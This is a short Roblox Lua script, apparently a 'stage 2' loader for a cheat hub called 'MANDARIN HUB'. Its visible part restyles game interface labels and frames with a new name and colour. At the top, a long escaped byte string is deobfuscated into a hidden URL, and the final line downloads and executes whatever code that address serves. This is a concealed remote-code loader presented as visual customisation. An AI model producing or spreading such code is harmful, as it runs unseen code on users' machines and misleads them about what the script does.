
--[[ STAGE 2: VISUAL CORE ]]
local ELY7BbjInKa0="\123\107\134\072\135\070\075\065\155\087\161\167\125\171\177\164\167\193\145\153\117\184\165\212\199\198\181\232\237\215\197\187\205\002\003\008\007\253\000\247\237\027\017\039\039\050\047\004\013\041\063\040\013\080\091\087\095\033\102\106\107\089\121\117\131\108\128\073\134\125\148\151\159\155\167\167\172\177\180\121\191\193\193\136\182\208\207\194\220\225\225\212\231\221\223\244\231\006\238\015\005\208\253\023\008\225\229\220\025\030\030\034\066"local o9hCjSXXwwvuuzuoULwl=22 local xVxk50JTwVLbpXgm7jW=234 local CLotT1t0LMK5=0 local dKQaJLzYAan4mjyHtCTTF=4 local YZpPje8LWf2PZ=22 local sf0uGHfZ6dbcZuFKd=true local vNlRimrLPPyGm=bit32 and bit32.bxor if not vNlRimrLPPyGm then vNlRimrLPPyGm=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local SUdNhtefZg09zKn57M7={}for Owvxhni6oZlRgwsJ_rw3wk=1,#ELY7BbjInKa0 do local r1D2Hx3sTe154jlqDpGtoV=string.byte(ELY7BbjInKa0,Owvxhni6oZlRgwsJ_rw3wk)local LoVmPxglg5Rs=(xVxk50JTwVLbpXgm7jW+(Owvxhni6oZlRgwsJ_rw3wk*dKQaJLzYAan4mjyHtCTTF)+YZpPje8LWf2PZ)%256 if CLotT1t0LMK5==0 then r1D2Hx3sTe154jlqDpGtoV=(r1D2Hx3sTe154jlqDpGtoV-LoVmPxglg5Rs)%256 SUdNhtefZg09zKn57M7[Owvxhni6oZlRgwsJ_rw3wk]=string.char(vNlRimrLPPyGm(r1D2Hx3sTe154jlqDpGtoV,o9hCjSXXwwvuuzuoULwl))else r1D2Hx3sTe154jlqDpGtoV=vNlRimrLPPyGm(r1D2Hx3sTe154jlqDpGtoV,o9hCjSXXwwvuuzuoULwl)SUdNhtefZg09zKn57M7[Owvxhni6oZlRgwsJ_rw3wk]=string.char((r1D2Hx3sTe154jlqDpGtoV-LoVmPxglg5Rs)%256)end end local IZC8Yagp3kHvkA7T=table.concat(SUdNhtefZg09zKn57M7)if sf0uGHfZ6dbcZuFKd then IZC8Yagp3kHvkA7T=string.reverse(IZC8Yagp3kHvkA7T)end local h8uZ3wn1dcs_NuSaBK=IZC8Yagp3kHvkA7T
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(h8uZ3wn1dcs_NuSaBK))()
